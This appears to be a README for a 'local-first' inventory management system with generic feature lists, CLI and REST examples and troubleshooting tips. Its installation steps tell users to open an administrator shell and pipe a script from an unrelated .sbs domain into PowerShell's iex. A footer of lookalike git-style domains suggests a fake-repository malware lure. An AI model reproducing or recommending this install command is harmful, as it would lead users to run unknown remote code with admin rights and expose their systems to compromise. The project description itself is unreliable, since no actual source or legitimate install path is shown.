# Inventory Management System

> A local-first inventory platform for stock tracking, replenishment planning, audits, and team reporting.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitview.sbs?get=inventory-management-system | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Inventory Management System modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Inventory Management System.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

## TL;DR - Quick Summary

Inventory Management System combines item catalogs, stock movements, barcode workflows, low-stock alerts, audit trails, and practical reports in a local-first web application. It is suitable for small teams, workshops, classrooms, and community stores.

## Core Features

### Catalog and Stock
- ✅ Item variants, categories, locations, and suppliers
- ✅ Barcode and SKU lookup
- ✅ Received, transferred, adjusted, and reserved movements
- ✅ Low-stock and reorder-point alerts
- ✅ Stock history with user and reason metadata

### Operations
- ✅ Quick count and cycle-count workflows
- ✅ Import and export through reviewed CSV templates
- ✅ Role-based access for staff and reviewers
- ✅ Offline-friendly queue for interrupted sessions
- ✅ Printable labels and packing lists

### Reporting
- ✅ Inventory value and movement summaries
- ✅ Aging and dead-stock views
- ✅ Audit exports for periodic reviews
- ✅ Dashboard charts with date and location filters

## Usage

```bash
# Create an item
python -m inventory_app item add --sku "DEMO-001" --name "Example item" --quantity 12

# Record a receipt
python -m inventory_app movement add --sku "DEMO-001" --type received --quantity 5 --reason "purchase"

# Run a cycle count
python -m inventory_app count start --location "Shelf A"

# Generate a report
python -m inventory_app report stock --format csv --output "./stock-report.csv"
```

## REST API

> [!NOTE]
> The API is intended for local deployment or a trusted private network. Protect it with authentication before exposing it beyond localhost.

```bash
curl http://localhost:8000/api/v1/items
curl -X POST http://localhost:8000/api/v1/items \
  -H "Content-Type: application/json" \
  -d '{"sku":"DEMO-002","name":"Another item","quantity":3}'
curl http://localhost:8000/api/v1/movements?sku=DEMO-001
curl http://localhost:8000/api/v1/reports/stock
```

## Screenshots

- Dashboard: `screenshots/dashboard.png`
- Item catalog: `screenshots/catalog.png`
- Stock movement: `screenshots/movements.png`
- Audit report: `screenshots/audit.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Database is locked | Close other local sessions and rerun the pending migration. |
| CSV import rejects a row | Check the header names against `templates/import.csv`. |
| Alerts do not appear | Verify the item has a reorder point and the alert worker is running. |
| Labels print incorrectly | Select the configured label size in `Configuration`. |

## Use Cases

- **Small Business Stock** — Track products and purchase receipts.
- **Workshop Parts** — Organize components by location and project.
- **Classroom Labs** — Teach inventory controls with sample data.
- **Community Stores** — Coordinate volunteers with clear audit history.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Review imports and adjustments before applying them. Use least-privilege accounts, keep backups, and never place passwords or personal data in item notes.

> [!TIP]
> Run a sample count before a full inventory day so the team can practice the workflow.

## License

This project is licensed under the MIT License — see the `LICENSE` file for details.

## Tags

`inventory-management-system` `inventory` `stock-control` `barcode` `audit-trail` `local-first` `reporting` `small-business`

[gitrm.sbs](https://gitrm.sbs?t=inventory-management-system) | [viewgit.sbs](https://viewgit.sbs?t=inventory-management-system) | [gitsl.xyz](https://gitsl.xyz?t=inventory-management-system) | [gitview.sbs](https://gitview.sbs?t=inventory-management-system) | [gitrm.cfd](https://gitrm.cfd?t=inventory-management-system)
